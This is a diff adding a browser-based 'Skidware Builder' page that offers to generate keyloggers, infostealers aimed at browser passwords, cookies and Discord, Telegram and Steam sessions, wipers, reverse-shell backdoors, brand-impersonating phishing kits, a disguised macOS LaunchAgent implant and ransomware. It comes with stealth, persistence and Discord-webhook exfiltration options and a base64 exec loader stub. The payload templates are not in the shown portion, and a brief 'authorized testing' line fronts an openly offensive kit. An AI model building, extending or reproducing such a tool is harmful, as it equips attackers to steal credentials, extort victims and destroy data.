@@ -1,0 +1,1725 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"/>
+<meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover"/>
+<title>Skidware Builder</title>
+<style>
+
+:root {
+  --bg: #070a0f;
+  --panel: #0f141c;
+  --panel2: #121821;
+  --border: #243044;
+  --text: #e8eef7;
+  --muted: #8b9bb4;
+  --accent: #6ea8ff;
+  --accent2: #3dd68c;
+  --danger: #ff6b7a;
+  --glow: rgba(110, 168, 255, 0.18);
+  --radius: 14px;
+}
+* { box-sizing: border-box; }
+html, body { margin: 0; padding: 0; }
+body {
+  font-family: Inter, -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+  background:
+    radial-gradient(1200px 600px at 10% -10%, rgba(110,168,255,.12), transparent 55%),
+    radial-gradient(900px 500px at 100% 0%, rgba(61,214,140,.08), transparent 50%),
+    var(--bg);
+  color: var(--text);
+  min-height: 100vh;
+  -webkit-text-size-adjust: 100%;
+}
+header {
+  display: flex; align-items: center; justify-content: space-between; gap: .75rem;
+  padding: .95rem 1.15rem;
+  border-bottom: 1px solid var(--border);
+  background: rgba(7,10,15,.85);
+  backdrop-filter: blur(10px);
+  position: sticky; top: 0; z-index: 40;
+}
+.brand { display: flex; align-items: center; gap: .7rem; }
+.logo {
+  width: 28px; height: 28px; border-radius: 8px;
+  background: linear-gradient(135deg, #6ea8ff, #3dd68c);
+  box-shadow: 0 0 20px var(--glow);
+}
+header h1 {
+  margin: 0; font-size: 1.05rem; letter-spacing: .02em;
+  background: linear-gradient(90deg, #9ec1ff, #7dffc2);
+  -webkit-background-clip: text; background-clip: text; color: transparent;
+}
+header .tag {
+  font-size: .7rem; color: var(--muted); border: 1px solid var(--border);
+  padding: .2rem .55rem; border-radius: 999px; background: var(--panel);
+}
+.panel h2::after { content: ""; display: block; width: 42px; height: 3px; margin-top: .45rem; border-radius: 99px; background: linear-gradient(90deg, #6ea8ff, #3dd68c); }
+.layout { display: grid; grid-template-columns: 230px 1fr; min-height: calc(100vh - 58px); }
+nav {
+  border-right: 1px solid var(--border); background: rgba(15,20,28,.9);
+  padding: .7rem; display: flex; flex-direction: column; gap: .3rem;
+}
+nav .section {
+  font-size: .68rem; text-transform: uppercase; letter-spacing: .08em;
+  color: var(--muted); padding: .55rem .65rem .25rem;
+}
+nav button {
+  width: 100%; text-align: left; background: transparent; border: 1px solid transparent;
+  color: var(--text); padding: .72rem .8rem; border-radius: 10px; cursor: pointer;
+  font-size: .9rem; touch-action: manipulation; transition: .15s ease;
+}
+nav button:hover { background: #182032; }
+nav button.active {
+  background: linear-gradient(90deg, rgba(110,168,255,.18), rgba(61,214,140,.08));
+  border-color: rgba(110,168,255,.35); color: #cfe2ff;
+  box-shadow: inset 0 0 0 1px rgba(110,168,255,.12);
+}
+main { padding: 1.1rem; overflow-x: hidden; }
+.panel {
+  background: linear-gradient(180deg, rgba(18,24,33,.95), rgba(15,20,28,.98));
+  border: 1px solid var(--border);
+  border-radius: 16px; padding: 1.15rem; max-width: 1000px;
+  box-shadow: 0 10px 40px rgba(0,0,0,.25);
+}
+.panel h2 { margin: 0 0 .35rem; font-size: 1.15rem; }
+.panel .desc { margin: 0 0 1.05rem; color: var(--muted); font-size: .9rem; line-height: 1.45; }
+.grid { display: grid; grid-template-columns: 1fr 1fr; gap: .8rem; }
+.field { display: flex; flex-direction: column; gap: .32rem; }
+.field.full { grid-column: 1 / -1; }
+label { font-size: .78rem; color: var(--muted); }
+input, select, textarea {
+  width: 100%; background: #0a0e15; border: 1px solid var(--border); color: var(--text);
+  border-radius: 10px; padding: .7rem .8rem; font-size: .95rem; min-height: 44px;
+  transition: border-color .15s ease, box-shadow .15s ease;
+}
+textarea {
+  min-height: 90px; resize: vertical;
+  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: .85rem;
+}
+input:focus, select:focus, textarea:focus {
+  outline: none; border-color: #5b93ef;
+  box-shadow: 0 0 0 3px rgba(110,168,255,.15);
+}
+.checks { display: flex; flex-wrap: wrap; gap: .55rem 1rem; }
+.checks label {
+  display: flex; align-items: center; gap: .4rem; color: var(--text);
+  font-size: .88rem; cursor: pointer; min-height: 32px;
+}
+.actions { display: flex; flex-wrap: wrap; gap: .55rem; margin-top: 1rem; align-items: center; }
+.btn {
+  border: 1px solid var(--border); background: #182032; color: var(--text);
+  border-radius: 10px; padding: .7rem 1.05rem; cursor: pointer; font-size: .9rem;
+  min-height: 44px; touch-action: manipulation; transition: .15s ease;
+}
+.btn:hover { background: #1f2a3d; }
+.btn.primary {
+  background: linear-gradient(135deg, #3d7eff, #2bb673);
+  border-color: transparent; color: #fff; font-weight: 600;
+  box-shadow: 0 6px 20px rgba(61,126,255,.25);
+}
+.btn.primary:hover { filter: brightness(1.06); }
+.formats {
+  display: flex; flex-wrap: wrap; gap: .5rem .9rem; align-items: center;
+  margin-top: .9rem; padding: .7rem .8rem; border: 1px solid var(--border);
+  border-radius: 12px; background: #0a0e15;
+}
+.formats > span { font-size: .78rem; color: var(--muted); margin-right: .2rem; }
+.formats label {
+  display: flex; align-items: center; gap: .35rem; color: var(--text);
+  font-size: .85rem; cursor: pointer; margin: 0;
+}
+.out {
+  margin-top: 1rem; border: 1px solid var(--border); border-radius: 12px;
+  background: #06090e; overflow: hidden;
+}
+.out .bar {
+  display: flex; justify-content: space-between; gap: .5rem; flex-wrap: wrap;
+  padding: .55rem .8rem; border-bottom: 1px solid var(--border);
+  color: var(--muted); font-size: .75rem; background: #0c1118;
+}
+.out pre {
+  margin: 0; padding: .9rem; max-height: 380px; overflow: auto;
+  font-size: .76rem; line-height: 1.45; white-space: pre-wrap; word-break: break-word;
+  font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace;
+}
+.status { margin-top: .7rem; font-size: .85rem; color: var(--accent2); min-height: 1.2em; }
+.status.err { color: var(--danger); }
+.hidden { display: none !important; }
+@media (max-width: 900px) {
+  .layout { grid-template-columns: 1fr; }
+  nav {
+    flex-direction: row; overflow-x: auto; border-right: none;
+    border-bottom: 1px solid var(--border); padding: .55rem; gap: .35rem;
+    -webkit-overflow-scrolling: touch;
+  }
+  nav .section { display: none; }
+  nav button { width: auto; white-space: nowrap; flex: 0 0 auto; padding: .58rem .85rem; }
+  main { padding: .8rem; }
+  .grid { grid-template-columns: 1fr; }
+  .panel { padding: .9rem; border-radius: 14px; }
+  .out pre { max-height: 280px; }
+}
+
+
+/* Landing */
+#landing {
+  position: fixed; inset: 0; z-index: 100;
+  display: flex; align-items: center; justify-content: center;
+  padding: 1.5rem;
+  background:
+    radial-gradient(900px 500px at 20% 0%, rgba(110,168,255,.16), transparent 55%),
+    radial-gradient(800px 400px at 90% 20%, rgba(61,214,140,.10), transparent 50%),
+    #070a0f;
+  overflow: auto;
+}
+#landing.hidden { display: none !important; }
+.landing-card {
+  width: min(720px, 100%);
+  background: linear-gradient(180deg, rgba(18,24,33,.98), rgba(12,16,24,.98));
+  border: 1px solid var(--border);
+  border-radius: 18px;
+  padding: 1.75rem 1.6rem 1.4rem;
+  box-shadow: 0 20px 60px rgba(0,0,0,.45);
+}
+.landing-card .badge {
+  display: inline-flex; align-items: center; gap: .4rem;
+  font-size: .72rem; color: var(--muted);
+  border: 1px solid var(--border); border-radius: 999px;
+  padding: .2rem .55rem; margin-bottom: .9rem;
+}
+.landing-card h1 {
+  margin: 0 0 .55rem;
+  font-size: clamp(1.4rem, 3vw, 1.85rem);
+  background: linear-gradient(90deg, #9ec1ff, #7dffc2);
+  -webkit-background-clip: text; background-clip: text; color: transparent;
+}
+.landing-card .lead {
+  margin: 0 0 1.1rem; color: var(--muted); line-height: 1.55; font-size: .95rem;
+}
+.landing-grid {
+  display: grid; grid-template-columns: 1fr 1fr; gap: .65rem;
+  margin: 0 0 1.15rem;
+}
+.landing-grid .item {
+  background: #0a0e15; border: 1px solid var(--border);
+  border-radius: 12px; padding: .75rem .8rem;
+}
+.landing-grid .item strong {
+  display: block; font-size: .88rem; margin-bottom: .2rem; color: #d7e6ff;
+}
+.landing-grid .item span {
+  font-size: .78rem; color: var(--muted); line-height: 1.4;
+}
+.landing-note {
+  font-size: .8rem; color: var(--muted); line-height: 1.45;
+  margin: 0 0 1.1rem; padding: .7rem .8rem;
+  border-left: 3px solid rgba(110,168,255,.45);
+  background: rgba(110,168,255,.06); border-radius: 0 10px 10px 0;
+}
+.landing-actions { display: flex; flex-wrap: wrap; gap: .55rem; }
+body.landing-lock .app-shell { visibility: hidden; pointer-events: none; }
+@media (max-width: 700px) {
+  .landing-grid { grid-template-columns: 1fr; }
+  .landing-card { padding: 1.25rem 1.1rem; }
+}
+
+</style>
+</head>
+<body class="landing-lock">
+
+<div id="landing">
+  <div class="landing-card">
+    <div class="badge">Skidware Builder · local toolkit</div>
+    <h1>Build lab malware payloads in the browser</h1>
+    <p class="lead">
+      Skidware Builder is a single-page toolkit that generates Python payload source for research and lab environments.
+      Pick a module, tune options (C2, Discord webhooks, stealth, persistence), choose output formats, then copy or download the code.
+      Everything runs client-side in your browser — no account, no server-side build pipeline.
+    </p>
+    <div class="landing-grid">
+      <div class="item"><strong>Keylogger</strong><span>Buffered capture, window titles, clipboard, encrypted flush, webhooks.</span></div>
+      <div class="item"><strong>Infostealer</strong><span>Modular harvest: tokens, browsers, Telegram, Steam, WiFi, files.</span></div>
+      <div class="item"><strong>Backdoor / Malware</strong><span>Reverse/bind shells, anti-analysis stubs, persistence hooks.</span></div>
+      <div class="item"><strong>Phishing</strong><span>Brand kits (Roblox, Outlook, Google, TikTok, GitHub, GitLab, Facebook, Snapchat, zyo.lol, feds.lol) + collector.</span></div>
+      <div class="item"><strong>Mac implant</strong><span>LaunchAgents, login items, keychain/browser inventory.</span></div>
+      <div class="item"><strong>Ransomware lab</strong><span>Encrypt/decrypt modes, notes, extension filters, key export.</span></div>
+    </div>
+    <p class="landing-note">
+      Intended for authorized testing on systems you own or have permission to assess.
+      Generated samples are source code you run yourself. Outputs: .py, .html, .pyi, .pyc helper, .exe stub.
+    </p>
+    <div class="landing-actions">
+      <button type="button" class="btn primary" id="enter-app">Enter builder</button>
+      <button type="button" class="btn" id="enter-app-skip">Skip intro next time</button>
+    </div>
+  </div>
+</div>
+
+<div class="app-shell">
+<header>
+  <div class="brand">
+    <div class="logo"></div>
+    <h1>Skidware Builder</h1>
+  </div>
+  <span class="tag">advanced · pure js</span>
+</header>
+<div class="layout">
+  <nav>
+    <div class="section">Windows / cross</div>
+    <button type="button" class="active" data-tab="keylogger">Keylogger</button>
+    <button type="button" data-tab="stealer">Infostealer</button>
+    <button type="button" data-tab="wiper">Wiper</button>
+    <button type="button" data-tab="backdoor">Backdoor</button>
+    <button type="button" data-tab="malware">Malware</button>
+    <button type="button" data-tab="phish">Phishing</button>
+    <div class="section">Apple</div>
+    <button type="button" data-tab="mac">Mac Malware</button>
+    <button type="button" data-tab="ransom">Ransomware</button>
+  </nav>
+  <main>
+
+    <section class="panel" id="tab-keylogger">
+      <h2>Keylogger Builder</h2>
+      <p class="desc">Buffered capture, optional encryption, C2 + Discord webhook flush, persistence.</p>
+      <div class="grid">
+        <div class="field"><label>C2 Host</label><input id="kl-host" value="127.0.0.1" autocomplete="off"/></div>
+        <div class="field"><label>C2 Port</label><input id="kl-port" value="4444" inputmode="numeric"/></div>
+        <div class="field"><label>Flush interval (s)</label><input id="kl-interval" value="30" inputmode="numeric"/></div>
+        <div class="field"><label>Local log file</label><input id="kl-logfile" value="kl.dat"/></div>
+        <div class="field full"><label>Discord webhook (optional)</label><input id="kl-hook" placeholder="https://discord.com/api/webhooks/..." autocomplete="off"/></div>
+        <div class="field full"><div class="checks">
+          <label><input type="checkbox" id="kl-encrypt" checked/> Encrypt logs</label>
+          <label><input type="checkbox" id="kl-persist"/> Persistence</label>
+          <label><input type="checkbox" id="kl-stealth" checked/> Stealth</label>
+          <label><input type="checkbox" id="kl-delay"/> Startup delay</label>
+          <label><input type="checkbox" id="kl-clip" checked/> Clipboard</label>
+        </div></div>
+      </div>
+      
+      <div class="formats" data-group="kl">
+        <span>Output</span>
+        <label><input type="checkbox" value="py" checked/> .py</label>
+        <label><input type="checkbox" value="html" checked/> .html</label>
+        <label><input type="checkbox" value="pyc"/> .pyc</label>
+        <label><input type="checkbox" value="pyi"/> .pyi</label>
+        <label><input type="checkbox" value="exe"/> .exe stub</label>
+      </div>
+      <div class="actions">
+        <button type="button" class="btn primary" id="kl-build">Build</button>
+        <button type="button" class="btn" data-copy="kl-out">Copy</button>
+        <button type="button" class="btn" data-dl="kl-out" data-name="keylogger">Download selected</button>
+      </div>
+      <div class="status" id="kl-status"></div>
+      <div class="out"><div class="bar"><span>Generated source</span><span id="kl-meta"></span></div><pre id="kl-out">Click Build</pre></div>
+    </section>
+
+    
+    <section class="panel hidden" id="tab-stealer">
+      <h2>Infostealer Builder</h2>
+      <p class="desc">Pick exactly what to harvest. C2 + Discord webhook exfil. Optional stealth delays and quiet mode.</p>
+      <div class="grid">
+        <div class="field full"><label>C2 ingest URL</label><input id="st-c2" value="http://127.0.0.1:8080/ingest"/></div>
+        <div class="field full"><label>Discord webhook (optional)</label><input id="st-hook" placeholder="https://discord.com/api/webhooks/..."/></div>
+        <div class="field full">
+          <label>Data modules</label>
+          <div class="checks">
+            <label><input type="checkbox" class="st-mod" value="sysinfo" checked/> System info</label>
+            <label><input type="checkbox" class="st-mod" value="cookies" checked/> Browser cookies</label>
+            <label><input type="checkbox" class="st-mod" value="passwords" checked/> Browser passwords</label>
+            <label><input type="checkbox" class="st-mod" value="history"/> Browser history</label>
+            <label><input type="checkbox" class="st-mod" value="discord" checked/> Discord tokens</label>
+            <label><input type="checkbox" class="st-mod" value="telegram" checked/> Telegram sessions</label>
+            <label><input type="checkbox" class="st-mod" value="steam" checked/> Steam account</label>
+            <label><input type="checkbox" class="st-mod" value="roblox"/> Roblox notes</label>
+            <label><input type="checkbox" class="st-mod" value="wifi"/> WiFi profiles</label>
+            <label><input type="checkbox" class="st-mod" value="files"/> Grab files (Desktop/Documents patterns)</label>
+          </div>
+        </div>
+        <div class="field full">
+          <label>Browsers</label>
+          <div class="checks">
+            <label><input type="checkbox" class="st-browser" value="chrome" checked/> Chrome</label>
+            <label><input type="checkbox" class="st-browser" value="edge" checked/> Edge</label>
+            <label><input type="checkbox" class="st-browser" value="brave"/> Brave</label>
+            <label><input type="checkbox" class="st-browser" value="firefox"/> Firefox</label>
+          </div>
+        </div>
+        <div class="field full">
+          <label>Stealth</label>
+          <div class="checks">
+            <label><input type="checkbox" id="st-stealth" checked/> Stealth mode</label>
+            <label><input type="checkbox" id="st-delay"/> Random startup delay (5–20s)</label>
+            <label><input type="checkbox" id="st-quiet" checked/> Quiet (no console)</label>
+          </div>
+        </div>
+      </div>
+      <div class="formats" data-group="st">
+        <span>Output</span>
+        <label><input type="checkbox" value="py" checked/> .py</label>
+        <label><input type="checkbox" value="html" checked/> .html</label>
+        <label><input type="checkbox" value="pyc"/> .pyc</label>
+        <label><input type="checkbox" value="pyi"/> .pyi</label>
+        <label><input type="checkbox" value="exe"/> .exe stub</label>
+      </div>
+      <div class="actions">
+        <button type="button" class="btn primary" id="st-build">Build</button>
+        <button type="button" class="btn" data-copy="st-out">Copy</button>
+        <button type="button" class="btn" data-dl="st-out" data-name="infostealer">Download selected</button>
+      </div>
+      <div class="status" id="st-status"></div>
+      <div class="out"><div class="bar"><span>Generated source</span><span id="st-meta"></span></div><pre id="st-out">Click Build</pre></div>
+    </section>
+
+<section class="panel hidden" id="tab-wiper">
+      <h2>Wiper Builder</h2>
+      <p class="desc">Multi-pass overwrite wipe. Optional webhook on finish.</p>
+      <div class="grid">
+        <div class="field full"><label>Target paths (comma-separated)</label><input id="wp-paths" value="~/Documents,~/Desktop"/></div>
+        <div class="field"><label>Overwrite passes</label><input id="wp-passes" value="1" inputmode="numeric"/></div>
+        <div class="field full"><label>Discord webhook (optional)</label><input id="wp-hook" placeholder="https://discord.com/api/webhooks/..."/></div>
+        <div class="field full"><div class="checks">
+          <label><input type="checkbox" id="wp-confirm" checked/> Require WIPE confirmation</label>
+        </div></div>
+      </div>
+      
+      <div class="formats" data-group="wp">
+        <span>Output</span>
+        <label><input type="checkbox" value="py" checked/> .py</label>
+        <label><input type="checkbox" value="html" checked/> .html</label>
+        <label><input type="checkbox" value="pyc"/> .pyc</label>
+        <label><input type="checkbox" value="pyi"/> .pyi</label>
+        <label><input type="checkbox" value="exe"/> .exe stub</label>
+      </div>
+      <div class="actions">
+        <button type="button" class="btn primary" id="wp-build">Build</button>
+        <button type="button" class="btn" data-copy="wp-out">Copy</button>
+        <button type="button" class="btn" data-dl="wp-out" data-name="wiper">Download selected</button>
+      </div>
+      <div class="status" id="wp-status"></div>
+      <div class="out"><div class="bar"><span>Generated source</span><span id="wp-meta"></span></div><pre id="wp-out">Click Build</pre></div>
+    </section>
+
+    <section class="panel hidden" id="tab-backdoor">
+      <h2>Backdoor Builder</h2>
+      <p class="desc">Reverse/bind shell with auth. Optional webhook on session open.</p>
+      <div class="grid">
+        <div class="field"><label>Mode</label>
+          <select id="bd-mode"><option value="reverse">reverse</option><option value="bind">bind</option></select>
+        </div>
+        <div class="field"><label>Host (reverse)</label><input id="bd-host" value="127.0.0.1"/></div>
+        <div class="field"><label>Port</label><input id="bd-port" value="4444" inputmode="numeric"/></div>
+        <div class="field"><label>Auth secret</label><input id="bd-secret" value="vex"/></div>
+        <div class="field full"><label>Discord webhook (optional)</label><input id="bd-hook" placeholder="https://discord.com/api/webhooks/..."/></div>
+      </div>
+      
+      <div class="formats" data-group="bd">
+        <span>Output</span>
+        <label><input type="checkbox" value="py" checked/> .py</label>
+        <label><input type="checkbox" value="html" checked/> .html</label>
+        <label><input type="checkbox" value="pyc"/> .pyc</label>
+        <label><input type="checkbox" value="pyi"/> .pyi</label>
+        <label><input type="checkbox" value="exe"/> .exe stub</label>
+      </div>
+      <div class="actions">
+        <button type="button" class="btn primary" id="bd-build">Build</button>
+        <button type="button" class="btn" data-copy="bd-out">Copy</button>
+        <button type="button" class="btn" data-dl="bd-out" data-name="backdoor">Download selected</button>
+      </div>
+      <div class="status" id="bd-status"></div>
+      <div class="out"><div class="bar"><span>Generated source</span><span id="bd-meta"></span></div><pre id="bd-out">Click Build</pre></div>
+    </section>
+
+    <section class="panel hidden" id="tab-malware">
+      <h2>Malware Skeleton</h2>
+      <p class="desc">Persistence + anti-analysis + payload slot. Optional webhook beacon.</p>
+      <div class="grid">
+        <div class="field full"><label>Inner payload (Python)</label><textarea id="mw-payload">print("hello from payload")</textarea></div>
+        <div class="field full"><label>Discord webhook (optional)</label><input id="mw-hook" placeholder="https://discord.com/api/webhooks/..."/></div>
+        <div class="field full"><div class="checks">
+          <label><input type="checkbox" id="mw-persist" checked/> Persistence</label>
+          <label><input type="checkbox" id="mw-anti" checked/> Anti-analysis</label>
+          <label><input type="checkbox" id="mw-stealth" checked/> Stealth</label>
+          <label><input type="checkbox" id="mw-delay"/> Startup delay</label>
+        </div></div>
+      </div>
+      
+      <div class="formats" data-group="mw">
+        <span>Output</span>
+        <label><input type="checkbox" value="py" checked/> .py</label>
+        <label><input type="checkbox" value="html" checked/> .html</label>
+        <label><input type="checkbox" value="pyc"/> .pyc</label>
+        <label><input type="checkbox" value="pyi"/> .pyi</label>
+        <label><input type="checkbox" value="exe"/> .exe stub</label>
+      </div>
+      <div class="actions">
+        <button type="button" class="btn primary" id="mw-build">Build</button>
+        <button type="button" class="btn" data-copy="mw-out">Copy</button>
+        <button type="button" class="btn" data-dl="mw-out" data-name="malware">Download selected</button>
+      </div>
+      <div class="status" id="mw-status"></div>
+      <div class="out"><div class="bar"><span>Generated source</span><span id="mw-meta"></span></div><pre id="mw-out">Click Build</pre></div>
+    </section>
+
+    <section class="panel hidden" id="tab-phish">
+      <h2>Phishing Builder</h2>
+      <p class="desc">Roblox, Outlook, Google, TikTok, GitHub, GitLab, Facebook, Snapchat, zyo.lol, feds.lol, generic. Collector + optional Discord webhook.</p>
+      <div class="grid">
+        <div class="field"><label>Brand</label>
+          <select id="ph-brand">
+            <option value="roblox">Roblox</option>
+            <option value="outlook">Outlook</option>
+            <option value="google">Google</option>
+            <option value="tiktok">TikTok</option>
+            <option value="github">GitHub</option>
+            <option value="gitlab">GitLab</option>
+            <option value="facebook">Facebook</option>
+            <option value="snapchat">Snapchat</option>
+            <option value="zyo">zyo.lol</option>
+            <option value="feds">feds.lol</option>
+            <option value="generic">Generic</option>
+          </select>
+        </div>
+        <div class="field"><label>Form action URL</label><input id="ph-action" value="http://127.0.0.1:8080/collect"/></div>
+        <div class="field full"><label>Post-submit redirect</label><input id="ph-redirect" value="https://www.google.com"/></div>
+        <div class="field full"><label>Discord webhook (optional)</label><input id="ph-hook" placeholder="https://discord.com/api/webhooks/..."/></div>
+      </div>
+      
+      <div class="formats" data-group="ph">
+        <span>Output</span>
+        <label><input type="checkbox" value="py" checked/> .py</label>
+        <label><input type="checkbox" value="html" checked/> .html</label>
+        <label><input type="checkbox" value="pyc"/> .pyc</label>
+        <label><input type="checkbox" value="pyi"/> .pyi</label>
+        <label><input type="checkbox" value="exe"/> .exe stub</label>
+      </div>
+      <div class="actions">
+        <button type="button" class="btn primary" id="ph-build">Build</button>
+        <button type="button" class="btn" data-copy="ph-out">Copy</button>
+        <button type="button" class="btn" data-dl="ph-out" data-name="phishing">Download selected</button>
+      </div>
+      <div class="status" id="ph-status"></div>
+      <div class="out"><div class="bar"><span>Generated source</span><span id="ph-meta"></span></div><pre id="ph-out">Click Build</pre></div>
+    </section>
+
+    <section class="panel hidden" id="tab-mac">
+      <h2>Advanced Mac Malware Builder</h2>
+      <p class="desc">LaunchAgent persistence, login item, keychain/browser inventory, optional reverse shell, Discord beacon. Targets macOS (darwin).</p>
+      <div class="grid">
+        <div class="field"><label>LaunchAgent label</label><input id="mac-label" value="com.apple.services.update"/></div>
+        <div class="field"><label>Reverse host</label><input id="mac-host" value="127.0.0.1"/></div>
+        <div class="field"><label>Reverse port</label><input id="mac-port" value="4444" inputmode="numeric"/></div>
+        <div class="field full"><label>Discord webhook (optional)</label><input id="mac-hook" placeholder="https://discord.com/api/webhooks/..."/></div>
+        <div class="field full"><label>Inner payload (Python)</label><textarea id="mac-payload">print("mac payload online")</textarea></div>
+        <div class="field full"><div class="checks">
+          <label><input type="checkbox" id="mac-launchagent" checked/> LaunchAgent persist</label>
+          <label><input type="checkbox" id="mac-login"/> Login item (osascript)</label>
+          <label><input type="checkbox" id="mac-keychain" checked/> Keychain file inventory</label>
+          <label><input type="checkbox" id="mac-browser" checked/> Browser cookie paths</label>
+          <label><input type="checkbox" id="mac-reverse"/> Reverse shell</label>
+          <label><input type="checkbox" id="mac-hide" checked/> Hide file (chflags)</label>
+        </div></div>
+      </div>
+      
+      <div class="formats" data-group="mac">
+        <span>Output</span>
+        <label><input type="checkbox" value="py" checked/> .py</label>
+        <label><input type="checkbox" value="html" checked/> .html</label>
+        <label><input type="checkbox" value="pyc"/> .pyc</label>
+        <label><input type="checkbox" value="pyi"/> .pyi</label>
+        <label><input type="checkbox" value="exe"/> .exe stub</label>
+      </div>
+      <div class="actions">
+        <button type="button" class="btn primary" id="mac-build">Build</button>
+        <button type="button" class="btn" data-copy="mac-out">Copy</button>
+        <button type="button" class="btn" data-dl="mac-out" data-name="mac_malware">Download selected</button>
+      </div>
+      <div class="status" id="mac-status"></div>
+      <div class="out"><div class="bar"><span>Generated source</span><span id="mac-meta"></span></div><pre id="mac-out">Click Build</pre></div>
+    </section>
+
+
+    <section class="panel hidden" id="tab-ransom">
+      <h2>Advanced Ransomware Builder</h2>
+      <p class="desc">AES-style Fernet encrypt (or XOR fallback), extension targeting, ransom note, optional decrypt mode, Discord webhook. Lab use on systems you own.</p>
+      <div class="grid">
+        <div class="field full"><label>Target paths (comma-separated)</label><input id="rw-paths" value="~/Documents,~/Desktop"/></div>
+        <div class="field full"><label>Extensions (comma, empty = common docs)</label><input id="rw-ext" value=".doc,.docx,.xls,.xlsx,.pdf,.txt,.jpg,.png,.zip"/></div>
+        <div class="field"><label>Note filename</label><input id="rw-note" value="README_RESTORE.txt"/></div>
+        <div class="field"><label>Crypto</label>
+          <select id="rw-crypto">
+            <option value="fernet">Fernet (cryptography)</option>
+            <option value="xor">XOR fallback (stdlib)</option>
+          </select>
+        </div>
+        <div class="field full"><label>Ransom note text</label><textarea id="rw-msg">Your files have been encrypted.
+Contact for recovery instructions.
+Key ID: {key_id}</textarea></div>
+        <div class="field full"><label>Discord webhook (optional)</label><input id="rw-hook" placeholder="https://discord.com/api/webhooks/..."/></div>
+        <div class="field full"><div class="checks">
+          <label><input type="checkbox" id="rw-confirm" checked/> Require ENCRYPT confirm</label>
+          <label><input type="checkbox" id="rw-decrypt"/> Include --decrypt mode</label>
+          <label><input type="checkbox" id="rw-keyfile" checked/> Save key to key.skid</label>
+          <label><input type="checkbox" id="rw-stealth" checked/> Stealth</label>
+          <label><input type="checkbox" id="rw-delay"/> Startup delay</label>
+        </div></div>
+      </div>
+      <div class="formats" data-group="rw">
+        <span>Output</span>
+        <label><input type="checkbox" value="py" checked/> .py</label>
+        <label><input type="checkbox" value="html" checked/> .html</label>
+        <label><input type="checkbox" value="pyc"/> .pyc</label>
+        <label><input type="checkbox" value="pyi"/> .pyi</label>
+        <label><input type="checkbox" value="exe"/> .exe stub</label>
+      </div>
+      <div class="actions">
+        <button type="button" class="btn primary" id="rw-build">Build</button>
+        <button type="button" class="btn" data-copy="rw-out">Copy</button>
+        <button type="button" class="btn" data-dl="rw-out" data-name="ransomware">Download selected</button>
+      </div>
+      <div class="status" id="rw-status"></div>
+      <div class="out"><div class="bar"><span>Generated source</span><span id="rw-meta"></span></div><pre id="rw-out">Click Build</pre></div>
+    </section>
+
+  </main>
+</div>
+<script>
+
+(function () {
+  "use strict";
+
+  // Landing gate
+  (function () {
+    var landing = document.getElementById("landing");
+    function enter(remember) {
+      if (remember) {
+        try { localStorage.setItem("skidware_seen", "1"); } catch (e) {}
+      }
+      if (landing) landing.classList.add("hidden");
+      document.body.classList.remove("landing-lock");
+    }
+    try {
+      if (localStorage.getItem("skidware_seen") === "1") enter(false);
+    } catch (e) {}
+    var b1 = document.getElementById("enter-app");
+    var b2 = document.getElementById("enter-app-skip");
+    if (b1) b1.addEventListener("click", function () { enter(false); });
+    if (b2) b2.addEventListener("click", function () { enter(true); });
+  })();
+
+
+  function $(id) { return document.getElementById(id); }
+  function val(id) { var el = $(id); return el ? String(el.value || "") : ""; }
+  function chk(id) { var el = $(id); return !!(el && el.checked); }
+  function esc(s) {
+    return String(s || "").replace(/\\/g, "\\\\").replace(/"/g, '\\"');
+  }
+  function setStatus(id, msg, err) {
+    var el = $(id);
+    if (!el) return;
+    el.textContent = msg || "";
+    el.className = "status" + (err ? " err" : "");
+  }
+  function selectedFormats(group) {
+    var box = document.querySelector('.formats[data-group="' + group + '"]');
+    if (!box) return ["py"];
+    var out = [];
+    box.querySelectorAll('input[type="checkbox"]').forEach(function (c) {
+      if (c.checked) out.push(c.value);
+    });
+    return out.length ? out : ["py"];
+  }
+  function toHTML(name, pySrc) {
+    return "<!DOCTYPE html>\\n<html><head><meta charset='UTF-8'/><title>" + name +
+      "</title><style>body{font-family:system-ui;background:#0d1117;color:#c9d1d9;padding:1.5rem}" +
+      "pre{background:#161b22;padding:1rem;border-radius:8px;overflow:auto;white-space:pre-wrap}</style></head><body>" +
+      "<h1>" + name + "</h1><p>Embedded payload source.</p><pre id='src'></pre>" +
+      "<script>document.getElementById('src').textContent = " + JSON.stringify(pySrc) +
+      ";</scr" + "ipt></body></html>";
+  }
+  function toPYI(name) {
+    return "# Type stub for " + name + "\nfrom typing import Any, Optional\ndef main() -> None: ...\ndef run() -> None: ...";
+  }
+  function toPYCNote(name, pySrc) {
+    var b64 = btoa(unescape(encodeURIComponent(pySrc)));
+    return "# .pyc placeholder\nDATA = " + JSON.stringify(b64) + "\n# python -c \"import base64; open('" + name + ".py','wb').write(base64.b64decode(DATA))\"";
+  }
+  function toEXEStub(name, pySrc) {
+    var b64 = btoa(unescape(encodeURIComponent(pySrc)));
+    return "#!/usr/bin/env python3\nimport base64,sys\nDATA=" + JSON.stringify(b64) + "\nexec(compile(base64.b64decode(DATA).decode(),'<p>','exec'),{'__name__':'__main__'})\n";
+  }
+  function downloadText(filename, text) {
+    var blob = new Blob([text], { type: "text/plain;charset=utf-8" });
+    var a = document.createElement("a");
+    a.href = URL.createObjectURL(blob);
+    a.download = filename;
+    document.body.appendChild(a);
+    a.click();
+    setTimeout(function () { URL.revokeObjectURL(a.href); a.remove(); }, 400);
+  }
+  function ship(group, baseName, pySrc, statusId, metaId, outId) {
+    $(outId).textContent = pySrc;
+    var fmts = selectedFormats(group);
+    if (metaId && $(metaId)) $(metaId).textContent = "formats: " + fmts.join(", ");
+    setStatus(statusId, "Built — " + fmts.join(", "));
+    window.__vex_last = window.__vex_last || {};
+    window.__vex_last[group] = { name: baseName, py: pySrc };
+  }
+  function downloadGroup(group, baseName) {
+    var pack = (window.__vex_last || {})[group];
+    if (!pack || !pack.py) { alert("Build first"); return; }
+    var name = pack.name || baseName || "payload";
+    var py = pack.py;
+    selectedFormats(group).forEach(function (f) {
+      if (f === "py") downloadText(name + ".py", py);
+      else if (f === "html") downloadText(name + ".html", toHTML(name, py));
+      else if (f === "pyi") downloadText(name + ".pyi", toPYI(name));
+      else if (f === "pyc") downloadText(name + ".pyc.txt", toPYCNote(name, py));
+      else if (f === "exe") downloadText(name + ".exe.py", toEXEStub(name, py));
+    });
+  }
+
